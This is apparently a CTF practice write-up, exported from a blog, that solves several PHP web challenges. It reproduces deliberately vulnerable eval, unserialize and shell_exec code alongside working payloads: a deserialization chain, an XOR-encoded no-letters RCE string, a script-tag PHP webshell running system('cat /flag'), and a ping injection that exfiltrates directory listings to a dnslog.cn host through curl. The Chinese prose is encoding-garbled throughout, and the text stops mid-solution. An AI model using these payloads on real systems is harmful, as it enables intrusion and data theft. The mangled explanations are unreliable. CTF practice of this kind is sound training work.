      <url>/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="æ—¥å¸¸é¢˜ç›®ç»ƒä¹ ï¼ˆä¸€ï¼‰"><a href="#æ—¥å¸¸é¢˜ç›®ç»ƒä¹ ï¼ˆä¸€ï¼‰" class="headerlink" title="æ—¥å¸¸é¢˜ç›®ç»ƒä¹ ï¼ˆä¸€ï¼‰"></a>æ—¥å¸¸é¢˜ç›®ç»ƒä¹ ï¼ˆä¸€ï¼‰</h1><h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-ez-unserialize"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-ez-unserialize" class="headerlink" title="SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_unserialize"></a><a href="https://www.nssctf.cn/problem/3082">SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_unserialize</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class X</span><br><span class="line">&#123;</span><br><span class="line">    public $x = &quot;fllllllag.php&quot;;</span><br><span class="line">//    function __construct($x)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;x = $x;</span><br><span class="line">//    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;x !== *__FILE__*) &#123;</span><br><span class="line">            $this-&gt;x = &quot;fllllllag.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file($this-&gt;x);</span><br><span class="line">        //flag is in fllllllag.php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new X();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>ç®€å•çš„popé“¾ä¹¦å†™ï¼Œæ³¨æ„å†™çš„æ—¶å€™constructä¼šæŠ¥é”™ï¼Œå°†å…¶æ³¨é‡Šå³å¯</p><h2 id="é¹åŸæ¯-2022-ç®€å•çš„php"><a href="#é¹åŸæ¯-2022-ç®€å•çš„php" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•çš„php"></a>[é¹åŸæ¯ 2022]ç®€å•çš„php</h2><p>è¿™é¢˜å­¦åˆ°äº†ä¸€äº›æ–°çš„çŸ¥è¯†ç‚¹</p><p>æ— å‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(strlen($code) &gt; 80 or preg_match(&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;,$code))&#123;</span><br><span class="line">        die(&#x27; Hello&#x27;);</span><br><span class="line">    &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;, &#x27;&#x27;, $code))&#123;</span><br><span class="line">        @eval($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ— å‚rce</p><p>ä¸€ä¸ªæ— æ•°å­—å­—æ¯rceï¼Œå¥½å®¶ä¼™ï¼Œå¯æ˜¯ä¸ç®€å•</p><p>æ— å‚rceæ²¡è¿‡æ»¤system<a href="https://xz.aliyun.com/t/10212#toc-4">https://xz.aliyun.com/t/10212#toc-4</a></p><p>system(current(getallheaders()));</p><p>ç»“åˆæ— æ•°å­—å­—æ¯çš„å¼‚æˆ–</p><p>?code&#x3D;[<del>%8c%86%8c%8b%9a%92][!%FF]([</del>%9c%8a%8d%8d%9a%91%8b]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>); </p><p><code>[!%FF]</code>æ¥åˆ†å‰²</p><p>äºŒç»´æ•°ç»„è¿›è¡Œæ‹¼æ¥å¿…é¡»æœ‰ç”¨[!%FF]è¿›è¡Œåˆ†éš”</p><p>##[UUCTF 2022 æ–°ç”Ÿèµ›]ez_unser</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(*<span class="keyword">__FILE__</span>*);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>æœ¬æ¥æƒ³ç»•è¿‡wakeupçš„ï¼Œç»“æœæ­£åˆ™ç»™é™åˆ¶çš„æ­»æ­»çš„ï¼Œè¿™é‡Œåˆ©ç”¨å˜é‡ä¼ é€’ï¼Œå°†açš„å€¼ä¼ é€’ç»™b</p><h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-numgame"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-numgame" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]numgame"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]numgame</h2><p>æŸ¥çœ‹æºç å¯è¿›å…¥ä¸‹ä¸€å…³</p><p>&#x2F;NsScTf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//hint: ä¸getç›¸ä¼¼çš„å¦ä¸€ç§è¯·æ±‚åè®®æ˜¯ä»€ä¹ˆå‘¢ </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123; </span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>); </span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123; </span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>)) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æç¤ºè¯´æ˜¯postä¼ å‚ï¼Œæœ‰äº›ç–‘æƒ‘ï¼Œ</p><p>postä¼ </p><p>p&#x3D;nss2::ctf</p><p>å¾—åˆ°flag</p><h2 id="FSCTF-ez-eval"><a href="#FSCTF-ez-eval" class="headerlink" title="FSCTF [ez_eval]"></a>FSCTF [ez_eval]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="variable">$word</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$word</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$word</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>. <span class="variable">$word</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤šäºäº†æ™¨æ›¦å¸ˆå‚…çš„æŒ‡å¯¼ï¼Œæœ¬æ¥ç”¨çš„&lt;script${IFS}language&#x3D;â€™phpâ€™&gt;@eval($_POST[a]);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getï¼š?word=&lt;script%09language=&#x27;php&#x27;&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">postï¼šshell=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>æ™¨æ›¦å¸ˆå‚…è¯´${IFS}åœ¨bashé‡Œæ‰èƒ½ç”¨</p><h2 id="pingæ— å›æ˜¾"><a href="#pingæ— å›æ˜¾" class="headerlink" title="pingæ— å›æ˜¾"></a>pingæ— å›æ˜¾</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$target</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 1 &#x27;</span> . <span class="variable">$target</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?ip&#x3D;xhzw8u.dnslog.cn|ls &#x2F;| while read line; do echo $line.xhzw8u.dnslog.cn | xargs curl; done</p><p>bzd3p6.dnslog.cn|ls &#x2F;app| while read line; do echo $line.bzd3p6.dnslog.cn | xargs curl; done</p><p>dnslogå¾ªåå¤–å¸¦</p><h2 id="CISCN-2019åˆèµ›-Love-Math"><a href="#CISCN-2019åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019åˆèµ›]Love Math"></a>[CISCN 2019åˆèµ›]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜å³æœ‰é•¿é•¿çš„é»‘åå•è¿‡æ»¤ï¼Œè¿˜æœ‰å­—ç¬¦çš„è¿‡æ»¤ï¼Œéº»äº†ã€‚é¢˜ç›®æè¿°æœ‰æ•°å­¦å‡½æ•°ï¼Œå°è¯•äº†ä¸€ä¸ªæ•°å­¦å‡½æ•°</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029204949806-1700015833096-28-1700989374410-38-1700994492324-13.png" alt="image-20231029204949806"></p><p>å‘ç°æ­£å¥½å¯ä»¥æ‰§è¡Œï¼Œçœ‹åˆ°é¢˜ç›®é‡Œç»™çš„ç½‘ç«™ï¼Œã€‚é‡Œé¢å¥½å¤šçš„æ•°å­¦å‡½æ•°åˆ©ç”¨ï¼ŒçŒœæµ‹ä¸»è¦åˆ©ç”¨åˆ°base_convert()</p><p>ä»–å¯ä»¥å®ç°ä»»æ„è¿›åˆ¶ä¹‹é—´çš„è½¬æ¢</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029205130112-1700015833096-30-1700989374410-39-1700994492325-14.png" alt="image-20231029205130112"></p><p>ç»è¿‡äº†è§£å“ˆï¼Œæœ€é«˜å¯ä»¥åˆ°36è¿›åˆ¶</p><p><strong>36è¿›åˆ¶</strong>ï¼Œæ˜¯æ•°æ®çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•ã€‚åŒæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­çš„è¡¨ç¤ºæ³•ä¸ä¸€æ ·ã€‚å®ƒç”±0-9ï¼ŒA-Zç»„æˆï¼Œå­—æ¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¸10è¿›åˆ¶çš„å¯¹åº”å…³ç³»æ˜¯ï¼š0-9å¯¹åº”0-9ï¼›A-Få¯¹åº”10-35ã€‚</p><p>è¿›åˆ¶è¯´æ˜ï¼š36è¿›åˆ¶æ˜¯ 0-Z ï¼ˆ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZï¼‰ã€‚</p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ä»»ä½•è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</p><p>è¿™é‡Œç”¨å¤§äº26çš„è¿›åˆ¶å°±èƒ½æ„é€ </p><p>è¿™é‡Œæˆ‘æ²¡æƒ³çš„åˆ°çš„æ˜¯ï¼Œè¿™é‡Œæ„é€ çš„é«˜è¿›åˆ¶æ•°å­—ä¼šå½“ä½œå­—ç¬¦ä¸²å¤„ç†,è€Œä¸æ˜¯å½“ä½œæ•°å­—å¤„ç†</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå¯è¡Œè½¬æ¢å¯ä»¥ç”¨èµ›åšå¨å­çš„frombaseè§£å¯†ï¼ˆå°±æ˜¯ä»36è¿›åˆ¶è½¬åˆ°10è¿›åˆ¶ï¼‰</p><p>?c&#x3D;base_convert(55490343972,10,36)()</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029211044492-1700015833096-32-1700989374411-41-1700994492325-17.png" alt="image-20231029211044492"></p><p>ä¹‹ååŒç†ï¼Œæˆ‘ä»¬æ‹¼æ¥system</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ„é€ å­—æ¯é‚£å…¶å®æ„é€ åˆ«çš„ç¬¦å·å¯ä»¥å…ˆæ„é€ åˆ«çš„å‡½æ•°å®ç°</p><p>è¿™é‡Œç”¨è¿™ä¸¤ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dechex()å‡½æ•°ï¼š</span><br><span class="line">å¯ä»¥å°†åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</span><br><span class="line">hex2bin()å‡½æ•°ï¼š</span><br><span class="line">å¯ä»¥å°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºasciiç </span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå•å¼•å·å°±æ˜¯</p><p>?c&#x3D;base_convert(37907361743,10,36)(27)</p><p>è¿™é‡Œæƒ³åŠæ³•æ„é€ ä¸€ä¸ªå‚æ•°ä¼ å…¥ç‚¹ï¼Œç±»ä¼¼$_GET[1]è¿™æ ·</p><p>è¿™é‡Œ_ å’Œ []è¿‡æ»¤äº† å› æ­¤è¦ç”¨å‰é¢å°æ•°ç‚¹çš„æ–¹æ³•æ„é€ </p><p>ä¸ºäº†çœé•¿åº¦ ä¸€æ¬¡æ€§æŠŠ_GETéƒ½æ„é€ å‡ºæ¥</p><p>[è¢«è¿‡æ»¤äº† å¯ä»¥ç”¨{ä»£æ›¿ 